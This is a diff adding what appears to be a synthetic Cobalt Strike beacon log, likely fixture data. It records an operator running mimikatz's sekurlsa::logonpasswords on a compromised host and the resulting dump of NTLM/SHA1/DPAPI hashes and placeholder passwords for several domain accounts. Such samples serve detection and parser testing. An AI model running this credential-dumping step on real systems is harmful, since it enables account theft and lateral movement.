@@ -1,0 +1,350 @@
+10/13 16:12:35 UTC [metadata] 192.168.3.108 <- 192.168.3.108; computer: COMPUTER001; user: allison_powell *; process: update.exe; pid: 3812; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/13 16:12:40 UTC [input] <analyst01> logonpasswords
+10/13 16:12:40 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+10/13 16:13:26 UTC [checkin] host called home, sent: 438866 bytes
+10/13 16:13:27 UTC [output]
+received output:
+
+Authentication Id : 0 ; 18009561 (00000000:0112cdd9)
+Session           : RemoteInteractive from 3
+User Name         : PRESTON_SMITH
+Domain            : EXAMPLE
+Logon Server      : COMPUTER002
+Logon Time        : 9/15/2020 4:15:52 PM
+SID               : S-1-5-21-784237421-1172847891-1752287046-1325
+	msv :	
+	 [00000003] Primary
+	 * Username : PRESTON_SMITH
+	 * Domain   : EXAMPLE
+	 * NTLM     : 5dd210785947abcb14a0d855fa90a5e1
+	 * SHA1     : 85473f02b8e47ebbd3b19b88b04ebdf5da45b328
+	 * DPAPI    : 14c054ac29b35b065dd508b4a47cae50
+	tspkg :	
+	wdigest :	
+	 * Username : PRESTON_SMITH
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : PRESTON_SMITH
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 18003664 (00000000:0112b6d0)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/15/2020 4:15:52 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 72c509223a9b4d87e9a16c3a28120551
+	 * SHA1     : 721d664f51ff1e9166c13b2bd3bf3265b8ac7980
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER001$
+	 * Domain   : example.int
+	 * Password : 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 12544174 (00000000:00bf68ae)
+Session           : RemoteInteractive from 2
+User Name         : allison_powell
+Domain            : EXAMPLE
+Logon Server      : COMPUTER002
+Logon Time        : 9/10/2020 5:31:24 PM
+SID               : S-1-5-21-784237421-1172847891-1752287046-2000
+	msv :	
+	 [00000003] Primary
+	 * Username : ALLISON_POWELL
+	 * Domain   : EXAMPLE
+	 * NTLM     : 8f00a9d599d5e74198989baa149b6d6d
+	 * SHA1     : 4cd3ebc411491e5a29d776004b5eb5804edd38ff
+	 * DPAPI    : 4e24920fffef93d5ceb680b3fdff6091
+	tspkg :	
+	wdigest :	
+	 * Username : ALLISON_POWELL
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : ALLISON_POWELL
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 12527808 (00000000:00bf28c0)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/10/2020 5:31:24 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 72c509223a9b4d87e9a16c3a28120551
+	 * SHA1     : 721d664f51ff1e9166c13b2bd3bf3265b8ac7980
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER001$
+	 * Domain   : example.int
+	 * Password : 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40965 (00000000:0000a005)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/28/2020 6:25:53 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 72c509223a9b4d87e9a16c3a28120551
+	 * SHA1     : 721d664f51ff1e9166c13b2bd3bf3265b8ac7980
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER001$
+	 * Domain   : example.int
+	 * Password : 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 90 de ad be ef 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : COMPUTER001$
+Domain            : EXAMPLE
+Logon Server      : (null)
+Logon Time        : 8/28/2020 6:25:53 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 72c509223a9b4d87e9a16c3a28120551
+	 * SHA1     : 721d664f51ff1e9166c13b2bd3bf3265b8ac7980
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER003$
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 18010036 (00000000:0112cfb4)
+Session           : RemoteInteractive from 3
+User Name         : PRESTON_SMITH
+Domain            : EXAMPLE
+Logon Server      : COMPUTER002
+Logon Time        : 9/15/2020 4:15:52 PM
+SID               : S-1-5-21-784237421-1172847891-1752287046-1325
+	msv :	
+	 [00000003] Primary
+	 * Username : PRESTON_SMITH
+	 * Domain   : EXAMPLE
+	 * NTLM     : 5dd210785947abcb14a0d855fa90a5e1
+	 * SHA1     : 85473f02b8e47ebbd3b19b88b04ebdf5da45b328
+	 * DPAPI    : 14c054ac29b35b065dd508b4a47cae50
+	tspkg :	
+	wdigest :	
+	 * Username : PRESTON_SMITH
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : PRESTON_SMITH
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	 [00000000]
+	 * Username : GREGG_JENNINGS
+	 * Domain   : EXAMPLE
+	 * Password : TestP@ssw0rd001!
+	credman :	
+
+Authentication Id : 0 ; 18003687 (00000000:0112b6e7)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/15/2020 4:15:52 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 7d4b2688a3d9c984236aba290160395f
+	 * SHA1     : 3ee472200ae163e61eb0688bb82f23e001eb4123
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER001$
+	 * Domain   : example.int
+	 * Password : P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 12543545 (00000000:00bf6639)
+Session           : RemoteInteractive from 2
+User Name         : allison_powell
+Domain            : EXAMPLE
+Logon Server      : COMPUTER002
+Logon Time        : 9/10/2020 5:31:24 PM
+SID               : S-1-5-21-784237421-1172847891-1752287046-2000
+	msv :	
+	 [00000003] Primary
+	 * Username : ALLISON_POWELL
+	 * Domain   : EXAMPLE
+	 * NTLM     : 8f00a9d599d5e74198989baa149b6d6d
+	 * SHA1     : 4cd3ebc411491e5a29d776004b5eb5804edd38ff
+	 * DPAPI    : 4e24920fffef93d5ceb680b3fdff6091
+	tspkg :	
+	wdigest :	
+	 * Username : ALLISON_POWELL
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : allison_powell
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 12527829 (00000000:00bf28d5)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/10/2020 5:31:24 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 7d4b2688a3d9c984236aba290160395f
+	 * SHA1     : 3ee472200ae163e61eb0688bb82f23e001eb4123
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER001$
+	 * Domain   : example.int
+	 * Password : P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/28/2020 6:25:53 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41000 (00000000:0000a028)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/28/2020 6:25:53 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 7d4b2688a3d9c984236aba290160395f
+	 * SHA1     : 3ee472200ae163e61eb0688bb82f23e001eb4123
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER001$
+	 * Domain   : example.int
+	 * Password : P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!P@ssw0rd002!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 21333 (00000000:00005355)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/28/2020 6:25:52 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 72c509223a9b4d87e9a16c3a28120551
+	 * SHA1     : 721d664f51ff1e9166c13b2bd3bf3265b8ac7980
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : COMPUTER001$
+Domain            : EXAMPLE
+Logon Server      : (null)
+Logon Time        : 8/28/2020 6:25:52 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER001$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER003$
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
